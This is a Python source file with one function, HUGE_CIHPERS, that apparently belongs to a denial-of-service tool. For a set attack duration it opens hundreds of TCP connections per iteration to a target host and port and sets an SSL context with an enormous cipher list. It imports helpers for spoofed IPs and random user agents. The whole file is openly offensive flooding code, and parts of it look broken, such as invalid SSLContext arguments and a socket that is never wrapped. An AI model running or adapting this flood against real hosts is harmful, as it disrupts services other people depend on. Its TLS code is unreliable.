import socket,ssl,threading,random
from MODEL.data import generate_url_path,get_target,gen_ips,random_useragent,gen_id

def HUGE_CIHPERS(target,methods,duration_sec_attack_dude):
    for _ in range(int(duration_sec_attack_dude)):
        try:
          for _ in range(500):
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect((str(target['host']),int(target['port'])))
            s.connect_ex((str(target['host']),int(target['port'])))
            ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS,ssl.PROTOCOL_TLS_CLIENT,ssl.PROTOCOL_TLS_SERVER,ssl.PROTOCOL_TLSv1,ssl.PROTOCOL_TLSv1_1,ssl.PROTOCOL_TLSv1_2)
            ssl_context.set_ciphers('NULL-MD5:NULL-SHA:RC4-MD5:RC4-SHA:IDEA-CBC-SHA:DES-CBC3-SHA:DHE-DSS-DES-CBC3-SHA:DHE-RSA-DES-CBC3-SHA:ADH-RC4-MD5:ADH-DES-CBC3-SHA:NULL-SHA256:AES128-SHA256:AES256-SHA256:AES128-GCM-SHA256:AES256-GCM-SHA384:DH-RSA-AES128-SHA256:DH-RSA-AES256-SHA256:DH-RSA-AES128-GCM-SHA256:DH-RSA-AES256-GCM-SHA384:DH-DSS-AES128-SHA256:DH-DSS-AES256-SHA256:DH-DSS-AES128-GCM-SHA256:DH-DSS-AES256-GCM-SHA384:DHE-RSA-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384:DHE-DSS-AES128-SHA256:DHE-DSS-AES256-SHA256:DHE-DSS-AES128-GCM-SHA256:DHE-DSS-AES256-GCM-SHA384:ECDHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES128-SHA256:ECDHE-ECDSA-AES256-SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ADH-AES128-SHA256:ADH-AES256-SHA256:ADH-AES128-GCM-SHA256:ADH-AES256-GCM-SHA384:AES128-CCM:AES256-CCM:DHE-RSA-AES128-CCM:DHE-RSA-AES256-CCM:AES128-CCM8:AES256-CCM8:DHE-RSA-AES128-CCM8:DHE-RSA-AES256-CCM8:ECDHE-ECDSA-AES128-CCM:ECDHE-ECDSA-AES256-CCM:ECDHE-ECDSA-AES128-CCM8:ECDHE-ECDSA-AES256-CCM8:PSK-NULL-SHA:DHE-PSK-NULL-SHA:RSA-PSK-NULL-SHA:PSK-RC4-SHA:PSK-3DES-EDE-CBC-SHA:PSK-AES128-CBC-SHA:PSK-AES256-CBC-SHA:DHE-PSK-RC4-SHA:DHE-PSK-3DES-EDE-CBC-SHA:DHE-PSK-AES128-CBC-SHA:DHE-PSK-AES256-CBC-SHA:RSA-PSK-RC4-SHA:RSA-PSK-3DES-EDE-CBC-SHA:RSA-PSK-AES128-CBC-SHA:RSA-PSK-AES256-CBC-SHA:PSK-AES128-GCM-SHA256:PSK-AES256-GCM-SHA384:DHE-PSK-AES128-GCM-SHA256:DHE-PSK-AES256-GCM-SHA384:RSA-PSK-AES128-GCM-SHA256:RSA-PSK-AES256-GCM-SHA384:PSK-AES128-CBC-SHA256:PSK-AES256-CBC-SHA384:PSK-NULL-SHA256:PSK-NULL-SHA384:DHE-PSK-AES128-CBC-SHA256:DHE-PSK-AES256-CBC-SHA384:DHE-PSK-NULL-SHA256:DHE-PSK-NULL-SHA384:RSA-PSK-AES128-CBC-SHA256:RSA-PSK-AES256-CBC-SHA384:RSA-PSK-NULL-SHA256:RSA-PSK-NULL-SHA384:ECDHE-PSK-RC4-SHA:ECDHE-PSK-3DES-EDE-CBC-SHA:ECDHE-PSK-AES128-CBC-SHA:ECDHE-PSK-AES256-CBC-SHA:ECDHE-PSK-AES128-CBC-SHA256:ECDHE-PSK-AES256-CBC-SHA384:ECDHE-PSK-NULL-SHA:ECDHE-PSK-NULL-SHA256:ECDHE-PSK-NULL-SHA384:PSK-CAMELLIA128-SHA256:PSK-CAMELLIA256-SHA384:DHE-PSK-CAMELLIA128-SHA256:DHE-PSK-CAMELLIA256-SHA384:RSA-PSK-CAMELLIA128-SHA256:RSA-PSK-CAMELLIA256-SHA384:ECDHE-PSK-CAMELLIA128-SHA256:ECDHE-PSK-CAMELLIA256-SHA384:PSK-AES128-CCM:PSK-AES256-CCM:DHE-PSK-AES128-CCM:DHE-PSK-AES256-CCM:PSK-AES128-CCM8:PSK-AES256-CCM8:DHE-PSK-AES128-CCM8:DHE-PSK-AES256-CCM8:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-CHACHA20-POLY1305:DHE-RSA-CHACHA20-POLY1305:PSK-CHACHA20-POLY1305:ECDHE-PSK-CHACHA20-POLY1305:DHE-PSK-CHACHA20-POLY1305:RSA-PSK-CHACHA20-POLY1305:EDH-RSA-DES-CBC3-SHA:EDH-DSS-DES-CBC3-SHA:ECDHE-ECDSA-CAMELLIA128-SHA256:ECDHE-ECDSA-CAMELLIA256-SHA384:ECDHE-RSA-CAMELLIA128-SHA256:ECDHE-RSA-CAMELLIA256-SHA384:ARIA128-GCM-SHA256:ARIA256-GCM-SHA384:DHE-RSA-ARIA128-GCM-SHA256:DHE-RSA-ARIA256-GCM-SHA384:DHE-DSS-ARIA128-GCM-SHA256:DHE-DSS-ARIA256-GCM-SHA384:ECDHE-ECDSA-ARIA128-GCM-SHA256:ECDHE-ECDSA-ARIA256-GCM-SHA384:ECDHE-ARIA128-GCM-SHA256:ECDHE-ARIA256-GCM-SHA384:PSK-ARIA128-GCM-SHA256:PSK-ARIA256-GCM-SHA384:DHE-PSK-ARIA128-GCM-SHA256:DHE-PSK-ARIA256-GCM-SHA384:RSA-PSK-ARIA128-GCM-SHA256:RSA-PSK-ARIA256-GCM-SHA384:ECDHE-RSA-NULL-SHA:ECDHE-RSA-RC4-SHA:ECDHE-RSA-DES-CBC3-SHA:ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-NULL-SHA:ECDHE-ECDSA-RC4-SHA:ECDHE-ECDSA-DES-CBC3-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-ECDSA-AES256-SHA:AECDH-NULL-SHA:AECDH-RC4-SHA:AECDH-DES-CBC3-SHA:AECDH-AES128-SHA:AECDH-AES256-SHA:DHE-DSS-RC4-SHA:GOST2012-GOST8912-GOST8912:GOST2012-NULL-GOST12:GOST94-GOST89-GOST89:GOST2001-GOST89-GOST89:GOST94-NULL-GOST94:GOST2001-NULL-GOST94:SEED-SHA:DH-DSS-SEED-SHA:DH-RSA-SEED-SHA:DHE-DSS-SEED-SHA:DHE-RSA-SEED-SHA:ADH-SEED-SHA:CAMELLIA128-SHA:CAMELLIA256-SHA:DH-DSS-CAMELLIA128-SHA:DH-DSS-CAMELLIA256-SHA:DH-RSA-CAMELLIA128-SHA:DH-RSA-CAMELLIA256-SHA:DHE-DSS-CAMELLIA128-SHA:DHE-DSS-CAMELLIA256-SHA:DHE-RSA-CAMELLIA128-SHA:DHE-RSA-CAMELLIA256-SHA:ADH-CAMELLIA128-SHA:ADH-CAMELLIA256-SHA:AES128-SHA:AES256-SHA:DH-DSS-AES128-SHA:DH-DSS-AES256-SHA:DH-RSA-AES128-SHA:DH-RSA-AES256-SHA:DHE-DSS-AES128-SHA:DHE-DSS-AES256-SHA:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA:ADH-AES128-SHA:ADH-AES256-SHA:DH-DSS-DES-CBC3-SHA:DH-RSA-DES-CBC3-SHA:TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_CCM_SHA256:TLS_AES_128_CCM_8_SHA256:SSL_NULL_WITH_NULL_NULL IANA:TLS_NULL_WITH_NULL_NULL:SSL_RSA_WITH_NULL_MD5 IANA:TLS_RSA_WITH_NULL_MD5:SSL_RSA_WITH_NULL_SHA IANA:TLS_RSA_WITH_NULL_SHA:SSL_RSA_EXPORT_WITH_RC4_40_MD5 IANA:TLS_RSA_EXPORT_WITH_RC4_MD5:SSL_RSA_WITH_RC4_128_MD5 IANA:TLS_RSA_WITH_RC4_128_MD5:SSL_RSA_WITH_RC4_128_SHA IANA:TLS_RSA_WITH_RC4_128_SHA:SSL_RSA_EXPORT_WTIH_RC2_CBC_40_MD5 IANA:TLS_RSA_EXPORT_WITH_RC2_CBC_40_MD5:SSL_RSA_WITH_IDEA_CBC_SHA IANA:TLS_RSA_WITH_IDEA_CBC_SHA:SSL_RSA_EXPORT_WITH_DES40_CBC_SHA IANA:TLS_RSA_EXPORT_WITH_DES40_CBC_SHA:SSL_RSA_WITH_DES_CBC_SHA IANA:TLS_RSA_WITH_DES_CBC_SHA:SSL_RSA_WITH_3DES_EDE_CBC_SHA IANA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:SSL_DH_DSS_EXPORT_WITH_DES40_CBC_SHA IANA:TLS_DH_DSS_EXPORT_WITH_DES40_CBC_SHA:SSL_DH_DSS_WITH_DES_CBC_SHA IANA:TLS_DH_DSS_WITH_DES_CBC_SHA:SSL_DH_DSS_WITH_3DES_EDE_CBC_SHA IANA:TLS_DH_DSS_WITH_3DES_EDE_CBC_SHA:SSL_DH_RSA_EXPORT_WITH_DES40_CBC_SHA IANA:TLS_DH_RSA_EXPORT_WITH_DES40_CBC_SHA:SSL_DH_RSA_WITH_DES_CBC_SHA IANA:TLS_DH_RSA_WITH_DES_CBC_SHA:SSL_DH_RSA_WITH_3DES_EDE_CBC_SHA IANA:TLS_DH_RSA_WITH_3DES_EDE_CBC_SHA:SSL_DHE_DSS_EXPORT_WITH_DES40_CBC_SHA IANA:TLS_DHE_DSS_EXPORT_WITH_DES40_CBC_SHA:SSL_DHE_DSS_WITH_DES_CBC_SHA IANA:TLS_DHE_DSS_WITH_DES_CBC_SHA:SSL_DHE_DSS_WITH_3DES_EDE_CBC_SHA IANA:TLS_DHE_DSS_WITH_3DES_EDE_CBC_SHA:SSL_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA IANA:TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA:SSL_DHE_RSA_WITH_DES_CBC_SHA IANA:TLS_DHE_RSA_WITH_DES_CBC_SHA:SSL_DHE_RSA_WITH_3DES_EDE_CBC_SHA IANA:TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA:SSL_DH_anon_EXPORT_WITH_RC4_40_MD5 IANA:TLS_DH_anon_EXPORT_WITH_RC4_40_MD5:SSL_DH_anon_WITH_RC4_128_MD5 IANA:TLS_DH_anon_WITH_RC4_128_MD5:SSL_DH_anon_EXPORT_WITH_DES40_CBC_SHA IANA:TLS_DH_anon_EXPORT_WITH_DES40_CBC_SHA:SSL_DH_anon_WITH_DES_CBC_SHA IANA:TLS_DH_anon_WITH_DES_CBC_SHA:SSL_DH_anon_WITH_3DES_EDE_CBC_SHA IANA:TLS_DH_anon_WITH_3DES_EDE_CBC_SHA:TLS_KRB5_WITH_DES_CBC_SHA:TLS_KRB5_WITH_3DES_EDE_CBC_SHA:TLS_KRB5_WITH_RC4_128_SHA:TLS_KRB5_WITH_IDEA_CBC_SHA:TLS_KRB5_WITH_DES_CBC_MD5:TLS_KRB5_WITH_3DES_EDE_CBC_MD5:TLS_KRB5_WITH_RC4_128_MD5:TLS_KRB5_WITH_IDEA_CBC_MD5:TLS_KRB5_EXPORT_WITH_DES_CBC_40_SHA:TLS_KRB5_EXPORT_WITH_RC2_CBC_40_SHA:TLS_KRB5_EXPORT_WITH_RC4_40_SHA:TLS_KRB5_EXPORT_WITH_DES_CBC_40_MD5:TLS_KRB5_EXPORT_WITH_RC2_CBC_40_MD5:TLS_KRB5_EXPORT_WITH_RC4_40_MD5:TLS_PSK_WITH_NULL_SHA:TLS_DHE_PSK_WITH_NULL_SHA:TLS_RSA_PSK_WITH_NULL_SHA:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_DH_DSS_WITH_AES_128_CBC_SHA:TLS_DH_RSA_WITH_AES_128_CBC_SHA:TLS_DHE_DSS_WITH_AES_128_CBC_SHA:TLS_DHE_RSA_WITH_AES_128_CBC_SHA:TLS_DH_anon_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_DH_DSS_WITH_AES_256_CBC_SHA:TLS_DH_RSA_WITH_AES_256_CBC_SHA:TLS_DHE_DSS_WITH_AES_256_CBC_SHA:TLS_DHE_RSA_WITH_AES_256_CBC_SHA:TLS_DH_anon_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_NULL_SHA256:TLS_RSA_WITH_AES_128_CBC_SHA256:TLS_RSA_WITH_AES_256_CBC_SHA256:TLS_DH_DSS_WITH_AES_128_CBC_SHA256:TLS_DH_RSA_WITH_AES_128_CBC_SHA256:TLS_DHE_DSS_WITH_AES_128_CBC_SHA256:TLS_RSA_WITH_CAMELLIA_128_CBC_SHA:TLS_DH_DSS_WITH_CAMELLIA_128_CBC_SHA:TLS_DH_RSA_WITH_CAMELLIA_128_CBC_SHA:TLS_DHE_DSS_WITH_CAMELLIA_128_CBC_SHA:TLS_DHE_RSA_WITH_CAMELLIA_128_CBC_SHA:TLS_DH_anon_WITH_CAMELLIA_128_CBC_SHA:TLS_DHE_RSA_WITH_AES_128_CBC_SHA256:TLS_DH_DSS_WITH_AES_256_CBC_SHA256:TLS_DH_RSA_WITH_AES_256_CBC_SHA256:TLS_DHE_DSS_WITH_AES_256_CBC_SHA256:TLS_DHE_RSA_WITH_AES_256_CBC_SHA256:TLS_DH_anon_WITH_AES_128_CBC_SHA256:TLS_DH_anon_WITH_AES_256_CBC_SHA256:TLS_RSA_WITH_CAMELLIA_256_CBC_SHA:TLS_DH_DSS_WITH_CAMELLIA_256_CBC_SHA:TLS_DH_RSA_WITH_CAMELLIA_256_CBC_SHA:TLS_DHE_DSS_WITH_CAMELLIA_256_CBC_SHA:TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA:TLS_DH_anon_WITH_CAMELLIA_256_CBC_SHA:TLS_PSK_WITH_RC4_128_SHA:TLS_PSK_WITH_3DES_EDE_CBC_SHA:TLS_PSK_WITH_AES_128_CBC_SHA:TLS_PSK_WITH_AES_256_CBC_SHA:TLS_DHE_PSK_WITH_RC4_128_SHA:TLS_DHE_PSK_WITH_3DES_EDE_CBC_SHA:TLS_DHE_PSK_WITH_AES_128_CBC_SHA:TLS_DHE_PSK_WITH_AES_256_CBC_SHA:TLS_RSA_PSK_WITH_RC4_128_SHA:TLS_RSA_PSK_WITH_3DES_EDE_CBC_SHA:TLS_RSA_PSK_WITH_AES_128_CBC_SHA:TLS_RSA_PSK_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_SEED_CBC_SHA:TLS_DH_DSS_WITH_SEED_CBC_SHA:TLS_DH_RSA_WITH_SEED_CBC_SHA:TLS_DHE_DSS_WITH_SEED_CBC_SHA:TLS_DHE_RSA_WITH_SEED_CBC_SHA:TLS_DH_anon_WITH_SEED_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_DHE_RSA_WITH_AES_128_GCM_SHA256:TLS_DHE_RSA_WITH_AES_256_GCM_SHA384:TLS_DH_RSA_WITH_AES_128_GCM_SHA256:TLS_DH_RSA_WITH_AES_256_GCM_SHA384:TLS_DHE_DSS_WITH_AES_128_GCM_SHA256:TLS_DHE_DSS_WITH_AES_256_GCM_SHA384:TLS_DH_DSS_WITH_AES_128_GCM_SHA256:TLS_DH_DSS_WITH_AES_256_GCM_SHA384:TLS_DH_anon_WITH_AES_128_GCM_SHA256:TLS_DH_anon_WITH_AES_256_GCM_SHA384:TLS_PSK_WITH_AES_128_GCM_SHA256:TLS_PSK_WITH_AES_256_GCM_SHA384:TLS_DHE_PSK_WITH_AES_128_GCM_SHA256:TLS_DHE_PSK_WITH_AES_256_GCM_SHA384:TLS_RSA_PSK_WITH_AES_128_GCM_SHA256:TLS_RSA_PSK_WITH_AES_256_GCM_SHA384:TLS_PSK_WITH_AES_128_CBC_SHA256:TLS_PSK_WITH_AES_256_CBC_SHA384:TLS_PSK_WITH_NULL_SHA256:TLS_PSK_WITH_NULL_SHA384:TLS_DHE_PSK_WITH_AES_128_CBC_SHA256:TLS_DHE_PSK_WITH_AES_256_CBC_SHA384:TLS_DHE_PSK_WITH_NULL_SHA256:TLS_DHE_PSK_WITH_NULL_SHA384:TLS_RSA_PSK_WITH_AES_128_CBC_SHA256:TLS_RSA_PSK_WITH_AES_256_CBC_SHA384:TLS_RSA_PSK_WITH_NULL_SHA256:TLS_RSA_PSK_WITH_NULL_SHA384:TLS_RSA_WITH_CAMELLIA_128_CBC_SHA256:TLS_DH_DSS_WITH_CAMELLIA_128_CBC_SHA256:TLS_DH_RSA_WITH_CAMELLIA_128_CBC_SHA256:TLS_DHE_DSS_WITH_CAMELLIA_128_CBC_SHA256:TLS_DHE_RSA_WITH_CAMELLIA_128_CBC_SHA256:TLS_DH_anon_WITH_CAMELLIA_128_CBC_SHA256:TLS_RSA_WITH_CAMELLIA_256_CBC_SHA256:TLS_DH_DSS_WITH_CAMELLIA_256_CBC_SHA256:TLS_DH_RSA_WITH_CAMELLIA_256_CBC_SHA256:TLS_DHE_DSS_WITH_CAMELLIA_256_CBC_SHA256:TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA256:TLS_DH_anon_WITH_CAMELLIA_256_CBC_SHA256:TLS_EMPTY_RENEGOTIATION_INFO_SCSV:TLS_FALLBACK_SCSV:TLS_ECDH_ECDSA_WITH_NULL_SHA:TLS_ECDH_ECDSA_WITH_RC4_128_SHA:TLS_ECDH_ECDSA_WITH_3DES_EDE_CBC_SHA:TLS_ECDH_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDH_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_NULL_SHA:TLS_ECDHE_ECDSA_WITH_RC4_128_SHA:TLS_ECDHE_ECDSA_WITH_3DES_EDE_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDH_RSA_WITH_NULL_SHA:TLS_ECDH_RSA_WITH_RC4_128_SHA:TLS_ECDH_RSA_WITH_3DES_EDE_CBC_SHA:TLS_ECDH_RSA_WITH_AES_128_CBC_SHA:TLS_ECDH_RSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_RSA_WITH_NULL_SHA:TLS_ECDHE_RSA_WITH_RC4_128_SHA:TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_ECDH_anon_WITH_NULL_SHA:TLS_ECDH_anon_WITH_RC4_128_SHA:TLS_ECDH_anon_WITH_3DES_EDE_CBC_SHA:TLS_ECDH_anon_WITH_AES_128_CBC_SHA:TLS_ECDH_anon_WITH_AES_256_CBC_SHA:TLS_SRP_SHA_WITH_3DES_EDE_CBC_SHA:TLS_SRP_SHA_RSA_WITH_3DES_EDE_CBC_SHA:TLS_SRP_SHA_DSS_WITH_3DES_EDE_CBC_SHA:TLS_SRP_SHA_WITH_AES_128_CBC_SHA:TLS_SRP_SHA_RSA_WITH_AES_128_CBC_SHA:TLS_SRP_SHA_DSS_WITH_AES_128_CBC_SHA:TLS_SRP_SHA_WITH_AES_256_CBC_SHA:TLS_SRP_SHA_RSA_WITH_AES_256_CBC_SHA:TLS_SRP_SHA_DSS_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA384:TLS_ECDH_ECDSA_WITH_AES_128_CBC_SHA256:TLS_ECDH_ECDSA_WITH_AES_256_CBC_SHA384:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384:TLS_ECDH_RSA_WITH_AES_128_CBC_SHA256:TLS_ECDH_RSA_WITH_AES_256_CBC_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDH_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDH_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDH_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDH_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_PSK_WITH_RC4_128_SHA:TLS_ECDHE_PSK_WITH_3DES_EDE_CBC_SHA:TLS_ECDHE_PSK_WITH_AES_128_CBC_SHA:TLS_ECDHE_PSK_WITH_AES_256_CBC_SHA:TLS_ECDHE_PSK_WITH_AES_128_CBC_SHA256:TLS_ECDHE_PSK_WITH_AES_256_CBC_SHA384:TLS_ECDHE_PSK_WITH_NULL_SHA:TLS_ECDHE_PSK_WITH_NULL_SHA256:TLS_ECDHE_PSK_WITH_NULL_SHA384:TLS_RSA_WITH_ARIA_128_CBC_SHA256:TLS_RSA_WITH_ARIA_256_CBC_SHA384:TLS_DH_DSS_WITH_ARIA_128_CBC_SHA256:TLS_DH_DSS_WITH_ARIA_256_CBC_SHA384:TLS_DH_RSA_WITH_ARIA_128_CBC_SHA256:TLS_DH_RSA_WITH_ARIA_256_CBC_SHA384:TLS_DHE_DSS_WITH_ARIA_128_CBC_SHA256:TLS_DHE_DSS_WITH_ARIA_256_CBC_SHA384:TLS_DHE_RSA_WITH_ARIA_128_CBC_SHA256:TLS_DHE_RSA_WITH_ARIA_256_CBC_SHA384:TLS_DH_anon_WITH_ARIA_128_CBC_SHA256:TLS_DH_anon_WITH_ARIA_256_CBC_SHA384:TLS_ECDHE_ECDSA_WITH_ARIA_128_CBC_SHA256:TLS_ECDHE_ECDSA_WITH_ARIA_256_CBC_SHA384:TLS_ECDH_ECDSA_WITH_ARIA_128_CBC_SHA256:TLS_ECDH_ECDSA_WITH_ARIA_256_CBC_SHA384:TLS_ECDHE_RSA_WITH_ARIA_128_CBC_SHA256:TLS_ECDHE_RSA_WITH_ARIA_256_CBC_SHA384:TLS_ECDH_RSA_WITH_ARIA_128_CBC_SHA256:TLS_ECDH_RSA_WITH_ARIA_256_CBC_SHA384:TLS_RSA_WITH_ARIA_128_GCM_SHA256:TLS_RSA_WITH_ARIA_256_GCM_SHA384:TLS_DHE_RSA_WITH_ARIA_128_GCM_SHA256:TLS_DHE_RSA_WITH_ARIA_256_GCM_SHA384:TLS_DH_RSA_WITH_ARIA_128_GCM_SHA256:TLS_DH_RSA_WITH_ARIA_256_GCM_SHA384:TLS_DHE_DSS_WITH_ARIA_128_GCM_SHA256:TLS_DHE_DSS_WITH_ARIA_256_GCM_SHA384:TLS_DH_DSS_WITH_ARIA_128_GCM_SHA256:TLS_DH_DSS_WITH_ARIA_256_GCM_SHA384:TLS_DH_anon_WITH_ARIA_128_GCM_SHA256:TLS_DH_anon_WITH_ARIA_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_ARIA_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_ARIA_256_GCM_SHA384:TLS_ECDH_ECDSA_WITH_ARIA_128_GCM_SHA256:TLS_ECDH_ECDSA_WITH_ARIA_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_ARIA_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_ARIA_256_GCM_SHA384:TLS_ECDH_RSA_WITH_ARIA_128_GCM_SHA256:TLS_ECDH_RSA_WITH_ARIA_256_GCM_SHA384:TLS_PSK_WITH_ARIA_128_CBC_SHA256:TLS_PSK_WITH_ARIA_256_CBC_SHA384:TLS_DHE_PSK_WITH_ARIA_128_CBC_SHA256:TLS_DHE_PSK_WITH_ARIA_256_CBC_SHA384:TLS_RSA_PSK_WITH_ARIA_128_CBC_SHA256:TLS_RSA_PSK_WITH_ARIA_256_CBC_SHA384:TLS_PSK_WITH_ARIA_128_GCM_SHA256:TLS_PSK_WITH_ARIA_256_GCM_SHA384:TLS_DHE_PSK_WITH_ARIA_128_GCM_SHA256:TLS_DHE_PSK_WITH_ARIA_256_GCM_SHA384:TLS_RSA_PSK_WITH_ARIA_128_GCM_SHA256:TLS_RSA_PSK_WITH_ARIA_256_GCM_SHA384:TLS_ECDHE_PSK_WITH_ARIA_128_CBC_SHA256:TLS_ECDHE_PSK_WITH_ARIA_256_CBC_SHA384:TLS_ECDHE_ECDSA_WITH_CAMELLIA_128_CBC_SHA256:TLS_ECDHE_ECDSA_WITH_CAMELLIA_256_CBC_SHA384:TLS_ECDH_ECDSA_WITH_CAMELLIA_128_CBC_SHA256:TLS_ECDH_ECDSA_WITH_CAMELLIA_256_CBC_SHA384:TLS_ECDHE_RSA_WITH_CAMELLIA_128_CBC_SHA256:TLS_ECDHE_RSA_WITH_CAMELLIA_256_CBC_SHA384:TLS_ECDH_RSA_WITH_CAMELLIA_128_CBC_SHA256:TLS_ECDH_RSA_WITH_CAMELLIA_256_CBC_SHA384:TLS_RSA_WITH_CAMELLIA_128_GCM_SHA256:TLS_RSA_WITH_CAMELLIA_256_GCM_SHA384:TLS_DHE_RSA_WITH_CAMELLIA_128_GCM_SHA256:TLS_DHE_RSA_WITH_CAMELLIA_256_GCM_SHA384:TLS_DH_RSA_WITH_CAMELLIA_128_GCM_SHA256:TLS_DH_RSA_WITH_CAMELLIA_256_GCM_SHA384:TLS_DHE_DSS_WITH_CAMELLIA_128_GCM_SHA256:TLS_DHE_DSS_WITH_CAMELLIA_256_GCM_SHA384:TLS_DH_DSS_WITH_CAMELLIA_128_GCM_SHA256:TLS_DH_DSS_WITH_CAMELLIA_256_GCM_SHA384:TLS_DH_anon_WITH_CAMELLIA_128_GCM_SHA256:TLS_DH_anon_WITH_CAMELLIA_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_CAMELLIA_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_CAMELLIA_256_GCM_SHA384:TLS_ECDH_ECDSA_WITH_CAMELLIA_128_GCM_SHA256:TLS_ECDH_ECDSA_WITH_CAMELLIA_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_CAMELLIA_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_CAMELLIA_256_GCM_SHA384:TLS_ECDH_RSA_WITH_CAMELLIA_128_GCM_SHA256:TLS_ECDH_RSA_WITH_CAMELLIA_256_GCM_SHA384:TLS_PSK_WITH_CAMELLIA_128_GCM_SHA256:TLS_PSK_WITH_CAMELLIA_256_GCM_SHA384:TLS_DHE_PSK_WITH_CAMELLIA_128_GCM_SHA256:TLS_DHE_PSK_WITH_CAMELLIA_256_GCM_SHA384:TLS_RSA_PSK_WITH_CAMELLIA_128_GCM_SHA256:TLS_RSA_PSK_WITH_CAMELLIA_256_GCM_SHA384:TLS_PSK_WITH_CAMELLIA_128_CBC_SHA256:TLS_PSK_WITH_CAMELLIA_256_CBC_SHA384:TLS_DHE_PSK_WITH_CAMELLIA_128_CBC_SHA256:TLS_DHE_PSK_WITH_CAMELLIA_256_CBC_SHA384:TLS_RSA_PSK_WITH_CAMELLIA_128_CBC_SHA256:TLS_RSA_PSK_WITH_CAMELLIA_256_CBC_SHA384:TLS_ECDHE_PSK_WITH_CAMELLIA_128_CBC_SHA256:TLS_ECDHE_PSK_WITH_CAMELLIA_256_CBC_SHA384:TLS_RSA_WITH_AES_128_CCM:TLS_RSA_WITH_AES_256_CCM:TLS_DHE_RSA_WITH_AES_128_CCM:TLS_DHE_RSA_WITH_AES_256_CCM:TLS_RSA_WITH_AES_128_CCM_8:TLS_RSA_WITH_AES_256_CCM_8:TLS_DHE_RSA_WITH_AES_128_CCM_8:TLS_DHE_RSA_WITH_AES_256_CCM_8:TLS_PSK_WITH_AES_128_CCM:TLS_PSK_WITH_AES_256_CCM:TLS_DHE_PSK_WITH_AES_128_CCM:TLS_DHE_PSK_WITH_AES_256_CCM:TLS_PSK_WITH_AES_128_CCM_8:TLS_PSK_WITH_AES_256_CCM_8:TLS_DHE_PSK_WITH_AES_128_CCM_8:TLS_DHE_PSK_WITH_AES_256_CCM_8:TLS_ECDHE_ECDSA_WITH_AES_128_CCM:TLS_ECDHE_ECDSA_WITH_AES_256_CCM:TLS_ECDHE_ECDSA_WITH_AES_128_CCM_8:TLS_ECDHE_ECDSA_WITH_AES_256_CCM_8:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_DHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_PSK_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_PSK_WITH_CHACHA20_POLY1305_SHA256:TLS_DHE_PSK_WITH_CHACHA20_POLY1305_SHA256:TLS_RSA_PSK_WITH_CHACHA20_POLY1305_SHA256:HIGH:!aNULL:!kRSA:!MD5:!RC4:!PSK:!SRP:!DSS:!DSA:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:!eNULL:!EXPORT:!DES:!CAMELLIA:RC4:!EDH:!AESGCMECDHE-RSA-AES256-SHA:!AESGCM:!3DES:ECDH+AESGCM')
